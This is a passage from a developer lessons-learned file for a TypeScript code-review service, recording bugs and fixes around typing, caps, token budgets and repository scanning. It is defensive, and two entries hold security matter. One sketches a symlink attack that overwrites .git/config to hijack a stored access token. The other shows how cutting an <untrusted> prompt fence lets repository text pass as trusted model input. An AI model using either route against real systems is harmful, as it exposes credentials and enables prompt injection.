502 and an executor that must ignore it, with no `throwOnError` flag.


### Type a service's repository seam as an interface, not as the repository class

A repository declared `constructor(private db: Db) {}` cannot be satisfied by an object literal —
TypeScript requires private members to originate in the same declaration — so a fake needs a cast
through `as XRepository`, which lies, and which keeps compiling after a method is renamed. That,
not the constructor default, is why `AgentsService`, `RepoService` and `ReviewService` have no
hermetic tests (`onion-architecture` → testing-the-rings §3): it is a property of the *type
annotation*, not of the class.

`modules/blast/types.ts` takes the other route. `BlastReads` declares the two methods
`BlastService` calls, `BlastRepository` satisfies it structurally with its `private db` intact,
and `test/blast-service.test.ts` passes a plain object with no cast at all. Six lines, and it is
the whole difference between a service tested in 5 ms and one reachable only through Docker.

### A cap applied on one path of a two-path method lets the contract lie on the other

`RepoIntelService.getBlastRadius` has two implementations behind one signature: the persistent
Postgres path and the ripgrep/clone fallback. The persistent one capped callers at
`MAX_CALLERS_PER_SYMBOL` and returned `callerCounts`; the fallback did neither, so `toView`'s
`caller_count = callerCounts[name] ?? callers.length` made `truncated` false by construction
while an unbounded array shipped to the card and to MCP — for a field
`contracts/blast.ts` documents as the pre-cap number.

The rule: a bound or a count promised by a contract belongs to the *method*, not to its
happy path. Every `return` in a multi-path method has to satisfy the same contract, and the
cheapest way to check is to grep the method for `return` and read each one against the
contract's wording rather than against the branch you were editing.

Applying it also surfaces what the fallback's ordering really is. `capCallersPerSymbol` sorts
`rank DESC, file ASC, line ASC`; on the fallback every row has `rank: 0`, so the first key is
inert and the surviving 20 are the first 20 *filenames*. Deterministic, and honestly not by
importance — state that in a comment rather than letting a reader assume the persistent path's
ranking.

### `parseUnifiedDiff` counts the trailing empty line of a body as a covered context line

**Symptom.** `'@@ -1,1 +1,9 @@\n'` parses to a hunk with `newLineNumbers: [1]`, and the same
header with no trailing newline parses to `newLineNumbers: []`. A test fixture built with
`[...].join('\n')` and a final `''` therefore behaves differently from the identical body
posted by `curl --data-binary`.

**Cause.** The parser's last branch (`adapters/git/diff-parser.ts:70-74`) treats anything that
is not `+` or `-` as a context line and advances the new-side cursor, and `'x\n'.split('\n')`
leaves a trailing `''` for it to consume.

**Fix.** When a test is about a hunk that covers *nothing*, end the fixture at the `@@` header
with no trailing newline — `test/reviews-diff-guard.test.ts` does, and says why. The same quirk
is why the crafted 49-byte body in the 2026-08-09 finding had to omit its final newline to reach
`buildLineIndex`'s declared-range fallback: with the newline it covers one line and the fallback
never runs.

### A `Record` keyed by a repository-derived name is read with `Object.hasOwn`, never bare

**Symptom.** On 2026-08-09 `facts.callerCounts[sym.name]` returned `Object.prototype.toString`
for a changed symbol named `toString`. `noUncheckedIndexedAccess` types that read
`number | undefined`, which is exactly what makes `?? callers.length` look sound — the compiler
cannot see the prototype chain. The consequences were all silent: `JSON.stringify` drops a
function-valued key so `caller_count` vanished from the response, `b.caller_count -
a.caller_count` went `NaN`, and `totals.callers` string-concatenated to
`"0function toString() { [native code] }"`. One level down, a caller *file* named `toString`
made `factsByFile[file]` a function and the loop threw `labels is not iterable` — a 500 on
`GET /pulls/:id/blast` caused by a file name.

**Cause.** ast-grep emits class methods under their bare name (`adapters/astgrep/index.ts:272`,
only `constructor` is in `KEYWORDS`) and `getSymbolRows` applies no kind filter, so
`class X { toString() {} }` in any changed file produces such a row. The same holds for file
paths and for the free-form `reason` the indexer stamps.

**Fix.** `Object.hasOwn(record, key)` before the read — the precedent `client/INSIGHTS.md:684`
records for `value in OBJ`, now applied at `modules/blast/helpers.ts` in three places
(`REASON_PROSE`, `callerCounts`, `factsByFile`). Pinned by `test/blast-helpers.test.ts`, which
names the eight inherited keys one by one rather than saying "an inherited key". To find the
rest: `grep -rn "\[\(sym\|symbol\|file\|name\|reason\|label\|key\)[.a-zA-Z]*\]" src/`.

### A cap on an array that goes over the wire must not reach the number printed beside it

`toView` caps `symbol.endpoints` at `MAX_VIEW_ENDPOINTS` (20) because its length is repository
content — `extractEndpoints` emits one entry per matching line of a 400 KB file — but
`totals.endpoints` is what a reviewer reads as *how much this change reaches*. So the distinct
`(file, label)` keys are collected in `toView` **before** the slice and handed to `totals` as
parameters; re-deriving them from `symbols[].endpoints` would silently report 20 for a change
that reaches 500 routes. `endpoint_count` / `endpoints_truncated` carry the same admission into
the contract, next to the older `caller_count` / `truncated` pair. If you ever simplify
`totals(...)` back to reading the symbols, the tests that fail are in
`test/blast-helpers.test.ts` — and the number that silently changes is on the PR page.

### A jsonb column is untyped input: parse it on read, or `.default()` never fires

**Symptom.** `RunTrace.project_context` was added with `.default([])` and a comment saying the
default was load-bearing because "`RunTrace` is parsed on READ as well as on write". It was
not: `getRunTrace` (`modules/reviews/repository/run.repo.ts`) did `row.trace as RunTrace`. The
field is required on the OUTPUT type, so `TraceBody.tsx` read `trace.project_context.length`
off documents that have no such key — 282 of the 285 rows on the development database
(`select count(*) filter (where not (trace ? 'project_context')) from run_traces`). Nothing
between the two caught it: `GET /runs/:id/trace` declares no response schema and
`client/src/lib/api.ts` does not validate by design.

**Cause.** A cast is a promise about data the type system never saw. Every jsonb document
older than the field it is missing makes that promise false, and a default that nothing runs
is documentation, not behaviour.

**Fix.** `RunTrace.parse(row.trace)` in the repository, which is the edge for this value.
Verified before shipping by dumping all 285 rows and running `safeParse` over them (ok=285,
failed=0), then by serving all 285 through the live endpoint. A strict parse is only safe
because that check was run — and it immediately caught `test/reviews-nul-persist.it.test.ts`
storing `log[].t` as a number behind an `as unknown as RunTrace` cast.

### "In flight" needs its own column when the outcome columns must survive a failure

**Symptom.** `markScanning` was `insert … onConflictDoNothing`, so a rescan of an
already-scanned repo wrote nothing and `scanState()` kept answering `'scanned'`. The page's
`refetchInterval` (gated on `state === "scanning"`) never polled and the Rescan button never
disabled. `POST /repos/:id/context/rescan` returned `{"status":"scanning"}` while the very next
`GET .../context/docs` said `scanned`.

**Cause.** `'scanning'` was inferred from the ABSENCE of a result (`scanned_at IS NULL`), which
can only ever describe a first scan. The obvious repair — clear `scanned_at` on a rescan —
breaks the requirement that a failed rescan leave the previous count, time and documents
intact (`test/context.it.test.ts`, "a failed rescan leaves the previous result intact").

**Fix.** `repo_doc_scans.scanning_at` (migration `0016`), set by `markScanning` and cleared by
both `replaceDocs` and `recordScanFailure`. `scanState()` reads it first. It is also bounded by
`SCAN_CLAIM_STALE_MS`: only a process killed mid-scan can leave a claim behind, and believing
one forever polls forever AND disables the only button that would clear it.

### A path compared as a string must be canonicalised before it enters, not at each comparison

**Symptom.** A scan root stored as `docs/` or `./docs` produced a *successful* scan with zero
documents and no error anywhere. `resolveContextSettings` only trimmed whitespace.

**Cause.** Two consumers normalise differently. `GitClient.listFiles` resolves the root through
`path.join`, which normalises, so the walk finds `docs/a.md`; `rootFor()` in `scan-executor.ts`
then matches that path against the RAW configured string (`path === root ||
path.startsWith(root + '/')`), which `docs/` never satisfies, and the loop `continue`s every
file. `PUT /settings` accepts `context_scan_roots: z.array(z.string())` verbatim, so the
client-side scrub is not a defence.

**Fix.** `normalizeRoot()` in `modules/context/helpers.ts`, applied once in
`resolveContextSettings` and nowhere else — `./docs`, `docs/`, `docs//`, `.\docs` and `/docs`
all become `docs`; `.` and `` are dropped (both walk the whole repository and can label
nothing); a `..` segment is refused. De-duplicate AFTER normalising, or `docs` and `docs/`
survive as two roots over one directory.

### A write into the clone must refuse a symlink, where a read may follow one

`GitClient.readFile` resolves both sides with `realpath` and allows a symlink whose TARGET stays
inside the clone (`adapters/git/simple-git.ts`). `writeFile` and `makeDir` do the opposite: they
`lstat` every existing component and refuse `CloneWriteError('symlink')` if any of them is a link.
The asymmetry is the point, and it is not caution. A symlink is a pointer the *repository*
committed, so following one on a write hands the repository the choice of which file DevDigest
creates — `.devdigest/x.md` -> `../.git/config` replaces the remote URL that carries the stored
PAT, and `.devdigest/x.md` -> a path outside the tree does not even need containment to be
interesting. Verified live on 2026-08-14 against the running API and a real clone: both attacks
answered `400 invalid_path` and `.git/config` was byte-identical afterwards. Cases:
`test/git-write-containment.test.ts`.

### `.devdigest` is appended to the scan roots AFTER the defaults branch, never before

`resolveContextSettings` (`modules/context/settings.ts`) falls back to `DEFAULT_SCAN_ROOTS` on
`roots.length > 0`. Appending `DEVDIGEST_ROOT` anywhere before that branch makes the list non-empty
for EVERY workspace and silently deletes `specs`, `docs` and `insights` — a page that quietly stops
showing them, with no error anywhere. It is appended by `withDevdigest()` at the end, after
`normalizeRoot`, so a workspace that typed `.devdigest/` by hand gets one root and one group.
Test: `test/context-helpers.test.ts` -> "appends it AFTER the defaults fire".

### A size bound belongs where the code it produces is the code the caller renders

`CreateContextDocBody.content` deliberately carries no `.max()`. This app answers every route-schema
failure `422 validation_error` (the same reason `SetContextDocsBody.max(50)` is a 422), while the
size of a document is `400 too_large` — a distinct code the client renders as "this document is too
big" rather than "your request was malformed". So the bound lives in `ContextService.persistWrite`,
which checks code points AND bytes before the port call; an abusive body is stopped earlier by
Fastify's 1 MB `bodyLimit` in `app.ts`. Adding the `.max()` to the contract "for safety" changed the
status code and was reverted on 2026-08-14.

### `.devdigest` labels a document from the folder BELOW the root, not from the root

`kindForRoot(root, path)` (`modules/context/helpers.ts`) decides on the root's first segment for
every root except `.devdigest`, where it uses the first segment of the path below the root and only
when a further segment follows it:

    .devdigest/specs/public-api.md -> specs      .devdigest/adr/0001.md -> other
    .devdigest/docs/x.md           -> docs       .devdigest/x.md        -> other
    .devdigest/insights/x.md       -> insights   .devdigest/specs.md    -> other

`.devdigest` is a container, not a family — it exists because DevDigest needs somewhere untracked to
write (`AC-61`), and nobody chose it as a category. Deriving from the first segment labelled every
authored document `other` while the list row beside the badge read `specs/public-api.md`, which is
the row and the badge disagreeing about one document. BOTH callers must pass the path —
`scan-executor.ts` and `ContextService.persistWrite` — or a rescan relabels a document the write had
just labelled correctly; `test/context.it.test.ts` asserts create and rescan agree. Decided by the
human on 2026-08-14 after the question below was raised.

### The allowed-refs set is the PROMPT's inventory, not the gatherer's

`modules/brief` grounds every model reference against a set built from the blocks that survived
the budget walk (`fitToBudget(...).included`), never from the sources that were gathered
(`helpers.ts` → `buildAllowedRefs`). The two differ exactly where the walk cut something: a blast
answer the budget dropped would otherwise still license every endpoint label and caller file it
named, a dropped spec would license its own path, and on a 400-file PR the 360 paths that were
never printed would be members. Each of those is a reference to a document the model never saw,
stamped as grounded. `test/brief-allowed-refs.test.ts` is the file that carries the distinction —
`test/brief-service.test.ts` alone could not, because nothing gets dropped in a small fixture.

### `evicted_count` is a column because the read cannot reconstruct it

`pr_brief.evicted_count` is the running total of states evicted for a PR, stamped on the row the
write just persisted (`modules/brief/repository.ts`). Deriving "history truncated" from
`rows.length >= max_states` is the obvious alternative and it lies about the PR sitting at exactly
the cap, which has evicted nothing. An evicted row cannot carry the fact of its own eviction, so
the surviving newest row carries it — and the delete, the count and the stamp are one transaction,
because a crash between them leaves a row claiming a deletion that never happened.

### An eviction walk must exclude the row it just wrote, and `limit(max)` is not how

`upsertBrief` keeps `maxStates - 1` OTHER newest rows plus the one it wrote, rather than the
newest `maxStates` outright. Both look identical while the new row is the newest — which it
normally is, since `computed_at` is `new Date()` at write time. They differ when twenty states
carry timestamps ahead of the clock (an import, a machine whose time moved): selecting the newest
`maxStates` and adding this row keeps 21, and selecting the newest `maxStates` INCLUDING it
deletes what the call just persisted and returns `undefined`. Staged in
`test/brief.it.test.ts` — "never evicts the row it just wrote"; a mutation removing the exclusion
reds four cases in that file.

### A block exempt from the drop order is elastic, not exempt from the budget

`fitToBudget`'s `DROP_ORDER` deliberately omits `diff_stats` — a brief that does not know which
files changed is a different answer, not a degraded one. Until 2026-08-16 that also made it
**unbounded**: once every other block was dropped the function returned whatever `diffStatsBlock`
rendered, `run()` sent it, and `input_tokens_counted` recorded the overflow without refusing it.
The only cap on that block is `MAX_FILE_PATHS` (40) × `MAX_FILE_PATH_CHARS` (400) counted in CODE
POINTS, and **a code-point cap is not a token bound**: measured with `TiktokenTokenizer` and the
real 914-token system prompt, 40 × 400 ASCII is 3199 tokens, 40 × 400 `U+1F600` is 32939 and
40 × 400 `U+2A6B2` is 64719 — 8.1× a budget the feature states it holds. It is reachable, not
theoretical: `pr_files.path` is GitHub's `filename` inserted verbatim (`modules/pulls/routes.ts`)
and git permits any non-NUL byte in a name.

The fix is a `shrink(keep)` closure on `BriefBlock`, re-rendering the block from fewer paths after
the drop loop, binary-searched on the ITEM COUNT rather than on code points — half a path is a
reference to a file that does not exist. **Whatever shortens such a block must rebuild its `refs`
from exactly what survived**, which is why `shrink` returns a whole block and not a string; see the
allowed-refs entry above. The pattern generalises: if a block cannot be dropped, it needs an
elastic axis, or the budget is an intention rather than a bound.

### A service holding instance state is memoised by the container, never constructed by a route

`BriefService` carries the single-flight `inFlight` map that makes AC-45 true — two tabs on one PR
state pay for one model call. Until 2026-08-16 `brief/routes.ts` did `new BriefService(container,
new BriefRepository(container.db), app.log)`, so the lock held **by registration count** rather
than by construction: a second `app.register`, or the first non-HTTP caller (an MCP tool, a review
executor), would have got a fresh empty `Map` and nothing would have said so. The remedy is the
`blastService` shape — a memoised getter on `platform/container.ts`, the port declared
structurally in the slice's own `types.ts` (`BriefReader`, beside `BlastReader`), and the route
reduced to `const service = container.briefService;`.

Two things this does NOT get caught by. `no-db-from-routes` matches imports of
`src/db/(schema|client)`, and `container.db` needs no such import, so `pnpm arch` was green
throughout. And a memoisation bug is invisible to any test that builds the service itself —
`test/brief-routes.test.ts` asserts `container.briefService === container.briefService` and that an
`overrides.brief` actually answers the route, because those are the two halves the finding was
about.

The logger moved from the constructor to `compute(workspaceId, prId, log)` in the same change: the
composition root has no logger of its own, and `req.log` is a better one than `app.log` anyway.
`ReviewService`'s `logger?: Logger` method parameter is the existing precedent.

### `BlastEndpoint.line` is 0 for every endpoint the indexer produces — treat it as "unknown"

**Symptom.** `BlastRadiusView.symbols[].endpoints[].line` is typed `z.number().int()` and reads as a
real offset. Against the live index on 2026-08-16, the blast answer for `Holubinka/dev-digest` PR #20
(`curl localhost:3001/pulls/<id>/blast`) carries **125 endpoints and all 125 have `line: 0`**, while
symbol and caller lines are genuine. Every fixture in `server/test/` uses positive endpoint lines, so
nothing in the suite can express this.

**Cause.** The indexer resolves which FILE an endpoint sits in and not where inside it, and spells the
absent offset `0` rather than making the field nullable. `0` passes `z.number().int()`, so no parse and
no typecheck objects.

**Fix.** Any consumer deriving a displayable line must test `line > 0` and treat everything else as
"no line", not as line zero. `modules/brief/helpers.ts` · `blastBlock` does this in `noteLine`, which is
why a blast-admitted brief reference can end up with no `ref_lines` entry while still being a perfectly
good reference. Rendering `path:0` would be a placeholder wearing a number: AC-62 admits a suffix only
where the number is valid, and the client's own definition of a usable line (`/^[1-9][0-9]{0,6}$/`,
`plans/11` P4·8) rejects `0` one layer later — so the text would claim a line the jump then refuses.
The guard belongs per FACT, not per file: a file whose endpoint entry has no line may still get one
from a later symbol or caller fact about the same path.

### A number keyed by PATH is a guess when the input carries a number per FACT

**Symptom.** `pr_brief.ref_lines` is keyed by reference, i.e. by path, and the blast answer it is
derived from carries a line per fact — a symbol declaration, a call site, an endpoint. Three risks
citing `src/middleware/ratelimit.ts` therefore rendered the same `:45`, the same `#L45` GitHub link
and the same diff jump, off whichever fact `blastBlock` happened to print first. Reviewer round 11
called it, correctly: the number located the file's first fact, not the reference.

**Cause.** `noteLine` was first-occurrence-wins (`modules/brief/helpers.ts`, until 2026-08-17). Every
number it stored was real; which one a reader saw was a function of print order and of nothing else,
and nothing downstream could tell the difference.

**Fix (2026-08-17).** A path keeps a line only while every located fact about it names the same one;
a disagreement writes a `null` TOMBSTONE that later facts cannot lift. The guard now lives in
`mergeRefLine`, shared with `buildRefLines` so the cross-block merge cannot acquire a different rule
— read that name, not `noteLine`, in the `BlastEndpoint.line` entry above.

**Two ways of counting that look equivalent and are not.** Measured over four real blast answers
(PRs #17, #19, #20, #21) on 2026-08-17: first-occurrence-wins produced 105 numbers, agreement keeps
**53**. Counting FACTS instead of NUMBERS would have kept 43, and both of the six it loses are wrong
to lose — a fact with `line: 0` (all 125 endpoints of PR #20) establishes nothing and so cannot
disagree with anything, and one caller reaching two changed symbols is printed once under each, which
is four paths in those four PRs where the same measurement arrives twice. Halving the count is the
fix working; losing the duplicates would have been a second bug with the same shape.

### The annotation that closes a DTO hole cannot check a column the schema left as plain `text`

**Symptom.** `reviewToDto` is annotated `: ReviewRecord` as of 2026-08-17, which closes the hole the
two entries above describe — proved both ways against the live tree: adding `bogus: review.prId` to
the literal fails `TS2353`, deleting `head_sha` fails `TS2741`. One field would not compile:
`verdict`.

**Cause.** `reviews.verdict` is `text('verdict')` while `reviews.kind` beside it — and
`pr_intent.confidence`, `findings.severity`, `pull_requests.status`, every enum column in
`pr_brief` — is `text(name, { enum })`, the TypeScript-level vocabulary this schema's own comment
(`db/schema/reviews.ts:99-102`) says is the pattern. So the row type is `string | null` against the
contract's `Verdict | null`, and the mapper carries a cast.

**Fix.** Narrowing the column removes the cast and generates no migration — `text(name, { enum })`
emits the same SQL. It is a schema change, so it was left for a human; all 285 rows in the local
database already hold one of the three values (measured 2026-08-17). Until then, treat the cast as
the one unchecked field on that payload.

### Asking `listFiles` for `.json` finds one of this repo's five packages, not five

`GitClient.listFiles` filters by `extname` and by exact NAME, and the two are not
interchangeable. Measured 2026-08-17 by pointing `SimpleGitClient` at this repository as a clone,
`maxDepth: 2`, `maxFiles: 12`:

- `names: ['package.json'], extensions: []` → all five manifests (`client`, `e2e`, `mcp`,
  `reviewer-core`, `server`), `bounded: false`, 5 ms.
- `extensions: ['.json']` → 12 files, `bounded: true`, and exactly **one** of them is a manifest.
  The eleven ahead of it are `.claude/settings.json`, `.mcp.json`, `.pr-self-review/run/*.json`
  and `.retro/stats.json`, which sort first.

Two consequences. A package scan must ask by name, and the ceiling must be applied **after** the
filter — `simple-git.ts` slices `deduped` at the end of `listFiles` and never inside `walkDocs`,
which is why the twelve above are twelve matches rather than the first twelve files visited.

### `MockGitClient.listFiles` walks its `tree` verbatim — `EXCLUDED_WALK_DIRS` is not modelled

The mock honours `roots`, `extensions`, `names`, `maxDepth`, `maxFiles` and `maxFileBytes`, and as
of 2026-08-17 `test/git-list-files.test.ts` pins it to the same answers as `SimpleGitClient` for
all six. It does **not** skip `node_modules`, `dist`, `vendor` or the rest of
`adapters/git/constants.ts`: a fixture path under one of them comes back from the mock and never
from a clone. So "no package out of a dependency directory" is only assertable against
`SimpleGitClient` over a temp clone. The trap is the fix that suggests itself when a mock-backed
test disagrees — a second exclusion list inside the module, which is exactly what that constants
file's own comment exists to prevent.

### An output cap no criterion states is anchored on the supply that feeds it

`modules/onboarding/constants.ts` caps ten model-written arrays and strings, and the spec states
a number for exactly one of them (AC-72, four links). For the rest, the defensible anchor is the
code that bounds what could ever be grounded, not a preference: `MAX_FLOWS = 4` sits one below
`CRITICAL_PATH_ROOTS = 5` (`modules/repo-intel/service.ts:745`), because a flow whose steps must
come from those chains cannot survive past five; `MAX_FLOW_STEPS = 6` is twice `1 + BFS_DEPTH`
(`modules/repo-intel/constants.ts:59`), the longest chain the facade can return. A cap set above
its supply never binds and is therefore not a cap at all — it only looks like one in review.

The companion lesson is about the docstring rather than the number. `plan-verifier` marked step 2
of `plans/12-onboarding-tour-server-generation.md` PARTIAL on 2026-08-17 because 22 of 30
constants named both a reason and a source and 8 named neither, resting instead on the shared
block above their group. **A group block explains why the group of ceilings exists; it can never
say why one of them is that number**, and the eight it covered were the ones whose numbers came
from nowhere a reader could check. Where the source is a criterion, cite it by number — the
missing `AC-72` on `MAX_LINKS_PER_SECTION` was the clearest instance of the same gap.

### Stamping a failure on a full-row upsert has to read the previous row first

`repository.upsertIndexState` writes **every** column of `repo_index_state`, so the obvious
failure stamp — `safePersist(repo, id, '', 'failed', 0, 0, …)` — is not a status change, it is a
row replacement that erases `last_indexed_sha`. That sha is what `modules/blast/service.ts:100-113`
uses as `linkSha` for every line number it renders, so a failed **re**-index would destroy the
provenance of a neighbouring feature while looking like a one-word change. `pipeline/full.ts`
therefore reads `tryGetIndexState(repoId)` inside its catch and carries `lastIndexedSha`,
`filesIndexed` and `filesSkipped` forward: the stamp costs the status and nothing else
(2026-08-17, plan 13 P1.9, which called this out as a step of its own).

The general shape: when a partial-knowledge writer sits on a full-row upsert, "update one column"
does not exist. Either read-modify-write, or give the table a column the failure path can move on
its own. Nothing in the type system distinguishes the two — `IndexStateUpsert` demands all seven
fields whether you know them or not, which is exactly what makes zeros look like an answer.

### Grounding a command needs the authorising file's TEXT; its path only proves the wrong thing

A model-written `docker compose up -d postgres redis` cites `docker-compose.yml`, and that file
exists, so an existence check passes and the command ships. Run over this repository's own files on
2026-08-17, the real `docker-compose.yml` declares exactly one service — `postgres` — and the
command came out of `groundOnboarding` DROPPED and counted, which is the correct answer and the one
a path-only check cannot reach. `OnboardingSources.composeSources` therefore carries `{ path, text }`
rather than a list of paths, and `composeServices()` (`modules/onboarding/helpers.ts`) reads the
keys one level under `services:` with a line scanner — the repository has no YAML dependency and
does not need one, because a file the scanner cannot read yields an empty set and every service
named against it is dropped, which is the safe direction.

Worth knowing before the demo: `specs/assets/SPEC-03-onboarding-tour.png` shows
`docker compose up -d postgres redis`, and on DevDigest itself the `redis` half will never appear —
there is no such service in the compose file. That is the grounding working, not a defect.

The generalisation is the useful part: for any claim of the form "X authorises Y", check what the
authorisation actually asserts. A `cp A B` is authorised by `A` being the cited file (not merely by
`A` existing), a `<manager> <script>` by the script being a key of THAT package's own manifest, and
a compose service by the file declaring it. Each of the three was one `.has()` away from being a
check that always passes.

### With fenced inputs, `selectWithinBudget` decides WHICH block is cut and never how

`_shared/budget.ts` truncates the first oversized candidate with `truncateToBudget`, which takes a
code-point prefix of the rendered string. On a block wrapped in `<untrusted source="…">…</untrusted>`
that prefix ends inside the fence: the closing tag is gone and everything the model reads after it
is trusted prose — the one cut AC-79 exists to forbid. So a caller whose candidates are fenced uses
the walk for its STATUS (`included` / `truncated` / `dropped`, one cut point, reverse priority) and
re-does the cut itself, dropping whole fenced items from the tail and only re-fencing what is left
(`modules/onboarding/prompt.ts`, `truncateBlockToBudget`; used at
`modules/onboarding/generate-executor.ts`). The walk's own `blocks` output is discarded there.

Two smaller things fall out of the same reasoning. Each candidate is measured as
`BLOCK_SEPARATOR + block.text`, because the separator ships too, and the walk's budget is the
ceiling minus the system prompt AND minus the user message's fixed scaffold (its header and the
trusted preamble) — which is what turns "roughly within budget" into
`input_tokens_counted <= ONBOARDING_TOKEN_BUDGET` as an equality the test can assert. Subtracting
only the system prompt overshoots by the preamble, ~500 characters here (2026-08-17, plan 12 P5).

### `sanitizeRelativePath('.')` returns null, so a root package path cannot go through it

`_shared/repo-paths.ts` filters out `.` segments and refuses an empty result, which makes `.` — the
repo-relative path of a root package — an invalid path by its own rules. It is the right behaviour
for a path and the wrong gate for a KEY: `modules/onboarding/helpers.ts` matches a model-written
`package_path` against the set of packages the walk found, so it normalises (`./x` → `x`, `''` → `.`)
and looks the value up rather than sanitizing it. Membership in a code-authored set is the stronger
check of the two — nothing outside the walk's own output can pass it. Sanitize a string you are
about to USE as a path; look up a string that names one of your own records (2026-08-17, plan 12 P4).

### A port RETURNS the fact only the adapter knows; a module that restates it becomes copy three

`package_scan.excluded_dirs` had to disclose which directories the walk skipped, so
`modules/onboarding/packages.ts` kept `EXCLUDED_SCAN_DIRS` — an eight-name echo of
`adapters/git/constants.ts`, itself an echo of `modules/repo-intel/constants.ts`. The copy was
forced by architecture (`no-service-to-adapter-impl` stops the module importing the adapter's
list) and guarded by a hand-written equality test, which is as good as a copy gets and still one
list in three places. `listFiles` already returned `bounded` — a fact only the adapter knows —
and `excludedDirs` is the same kind of fact.

**Fix (2026-08-18).** `GitClient.listFiles` returns `excludedDirs` beside `files` and `bounded`;
`EXCLUDED_SCAN_DIRS` and its drift test were deleted together. The test existed only to hold the
echo to the port's list, so with no echo there was nothing left to hold — deleting the constant
and keeping the test would have left a test of nothing. **What to check:** when a module has to
report something only an adapter can know, widen the port's RESULT before copying the value; a
drift test is the sign you already chose wrong.

### A single-flight that joins before its gate answers the FIRST caller's gate, not yours

`OnboardingService.generate` checks `inFlight` (step 2) BEFORE it reads the index state and
refuses (step 3), which is the order plan 13 specifies and the order AC-74 needs: a second caller
must receive the running generation's result, not start a second one. The consequence is only
visible live. On 2026-08-18 a `POST /repos/:id/onboarding/generate` issued straight after
`update repo_index_state set status='failed'` did NOT answer `409 onboarding_index_failed` — it
hung for 15s and then for 111s, because a generation started minutes earlier was still running and
the new request joined it. Once nothing was in flight the same request refused in 13ms.

This is correct, not a defect, and it is worth knowing before debugging a gate that "does not
fire": a refusal is a statement about the state at the moment a generation STARTS. Anything that
joins an in-flight run inherits that moment. When verifying a gate by hand, drain the in-flight
run first — `select generated_at from onboarding where repo_id=…` twice, five seconds apart.

### Two log lines per generation, and the duplication is real

`OnboardingGenerateExecutor.run` writes `'onboarding tour generated'` (`generate-executor.ts:228`)
carrying the five drop counters, the inputs, the package-scan totals, `attempts`, `tokensIn` and
`costUsd`. `onboarding/routes.ts` then writes `'onboarding generation'` with almost the same
fields read off the record. Plan 13 mandated the route line and was written before slice A
existed, so neither author could see the other's.

Kept rather than silently dropped, because the obligation differs: AC-40 is this slice's, and
`container.onboardingGenerator` is overridable — every integration test replaces it with a canned
generator that logs nothing, so delegating the audit to the collaborator makes it conditional on
which implementation is wired. The cost is one duplicated line per paid generation. If an operator
finds that noisy, the route line is the one to drop, and this is the note that says why it was
there.

### `selectWithinBudget` can only ever report `truncated` on the FIRST candidate

`modules/_shared/budget.ts:91` truncates a candidate only while `blocks.length === 0`; every
later candidate that does not fit is `dropped`, and so is everything behind it. For an input
offered ITEM BY ITEM — the samples, the project documents, and since 2026-08-18 the critical-path
chains — that means no individual item is ever `truncated`. The `truncated` on that input's row
in `inputs[]` is an AGGREGATE computed in `inputRow` (`generate-executor.ts`): some items shipped
and some did not.

It cost two retunes of one fixture on 2026-08-18. A test that squeezes a split input expecting
its row to read `truncated` has to leave room for at least one whole item — squeeze one notch
harder and the row reads `dropped`, because zero of them shipped. Budget the fixture as
`ceiling − system − scaffold − everything of higher priority ≥ one item`, and remember the
higher-priority inputs now include one block per chain.

### The clock and the budget are one decision, so they live in one file

`modules/onboarding/sizing.ts` holds `budgetForIndex(filesIndexed)` and
`timeoutForBudget(budget)`, and the second takes the first's output rather than the file count on
purpose. A budget raised without its clock raised with it times out on exactly the repositories
the budget was raised for, and a timeout is a generation the provider has already been paid for
whose answer is thrown away (`SPEC-04 § D12`). Keeping them in separate files, or deriving both
from `files_indexed` independently, is how the pair drifts by one edit.

The value arrives at the generator as a PARAMETER (`OnboardingGenerateInput.filesIndexed`) from
the snapshot the service already read at its index gate — not through the container. The
generation port is deliberately unable to read the index state at all
(`generation-types.ts:36-43`), and a number handed over is not a port: it costs one field, while
widening the port would cost the property that this feature can never index.

### The multi-agent fan-out is SEQUENTIAL — `runReview` runs N agents one after another

**Symptom.** A feature brief for SPEC-05 (2026-08-26) stated as established fact that
"parallel execution already works — `POST /pulls/:id/review` and `run-executor` already handle
several agents". Nothing in the route name or the plural `runs`/`reviews` it returns contradicts
that. It is wrong.

**Cause.** Both fan-out paths are plain `for … await` loops:
`modules/reviews/run-executor.ts:203` — `for (const { agent, runId } of jobs) { … await
this.runOneAgent(…) }` — and `modules/reviews/diff-review.ts:199` on `POST /reviews/diff`. What
IS shared across the set is the PRE-WORK (diff, intent, repo-intel), computed once for all
agents; that is the "several agents" the executor genuinely does, and it is easy to mistake for
concurrency. `p-queue` is a dependency (`package.json:41`) but is used only in
`platform/jobs.ts:40` and `repo-intel/pipeline/full.ts:132` — never in `modules/reviews`.

**Fix.** Before promising anything time-shaped about a multi-agent run, read the loop. The root
`INSIGHTS.md` already carried the measurement that settles it — 2026-08-09, five agents on a
193-character diff, **1 min 35 s**, five sequential ~18 s calls — and nobody checked the brief
against it. Had it gone unchecked here, a pre-run estimate specified as `max(duration)` across
the selected agents would have been wrong by roughly the agent count (≈4× on four agents), and
the UI copy "parallel fan-out" would have been a claim the engine cannot support.

### Every `agent_runs` row of a fan-out is written `status: 'running'` up front

`repository/run.repo.ts:137` inserts each run with `status: 'running'` at creation, before any
agent starts. Combined with the sequential loop above, N runs report `running` simultaneously
while exactly one is executing — so a per-agent live status read straight from that column is
honest only about the set, never about the individual agent. Any UI that shows one lane per
agent (SPEC-05 column headers) needs a `queued` state that this column cannot currently express;
`AgentColumn.status` in the vendored contract knows only `done | failed | running`, and
`run.repo.ts:99` already writes a fourth value, `cancelled`, that it also cannot express.


### A slice the container constructs may not import `Container` — even as a type

**Symptom.** `platform/container.ts` memoises `EvalService`, so it imports
`modules/eval/service.js`. Writing `constructor(container: Container, …)` in that service — the
shape `onion-architecture` §3.3 prescribes and the plan's C4 restated — closes a two-file cycle
that `no-circular` rejects. `.dependency-cruiser.cjs` sets `tsPreCompilationDeps: true` and
`no-circular` has no `dependencyTypesNot`, so `import type` counts exactly like a value import.
**Cause.** §3.3's `Container` is safe only for a service the composition root does NOT construct.
`ReviewService` may name it because `container.ts` imports only `reviews/repository.js`. The four
services the root builds — `intent`, `blast`, `brief`, `onboarding` — all avoid it, and each one's
`types.ts` says so.
**Fix.** Declare the slice of the root you need structurally in `modules/<m>/types.ts` and name
that: `EvalContainer` lists `agentsRepo`, `reviewRepo`, `git` and `llm` as method shapes, and a
`Container` satisfies it by construction so the root still passes `this`. The narrowing is a
second benefit, not a cost — `EvalContainer.agentsRepo` names four methods, so this slice
provably cannot reach the rest of `AgentsRepository`. Same reason `_shared/feature-models.ts`
declares `SettingsReader` and `_shared/pr-diff.ts` declares `PrDiffSource`.

### The 23-file integration suite fails ~2 random tests in parallel and 0 serially

